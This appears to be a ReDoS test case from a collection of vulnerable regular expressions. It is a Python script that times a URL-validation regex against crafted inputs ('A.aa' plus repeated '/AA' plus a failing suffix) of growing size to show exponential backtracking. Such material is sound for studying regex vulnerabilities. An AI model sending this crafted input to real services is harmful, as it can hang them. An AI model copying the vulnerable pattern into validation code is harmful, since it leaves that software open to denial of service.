# 245
# ^(http(s?)\:\/\/)?(www.)?(([A-Za-z]+)([0-9]+)?([A-Za-z0-9\.\_\-]+)?)(\.)(([a-zA-Z]{2,})([0-9a-zA-Z]+)?)(\:\d{0,5})?(\/|(\/[A-Za-z]+([a-zA-Z0-9]+)?)+)?(\?[a-zA-Z0-9\\\&\%\_\.\/\-\=\~\*]+)?$
# EXPONENT
# nums:4
# EXPONENT AttackString:"A.aa"+"/AA"*32+"! _1_EOA(i or ii)"

import re
from time import perf_counter

regex = """^(http(s?)\:\/\/)?(www.)?(([A-Za-z]+)([0-9]+)?([A-Za-z0-9\.\_\-]+)?)(\.)(([a-zA-Z]{2,})([0-9a-zA-Z]+)?)(\:\d{0,5})?(\/|(\/[A-Za-z]+([a-zA-Z0-9]+)?)+)?(\?[a-zA-Z0-9\\\&\%\_\.\/\-\=\~\*]+)?$"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "A.aa" + "/AA" * i * 1 + "! _1_EOA(i or ii)"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")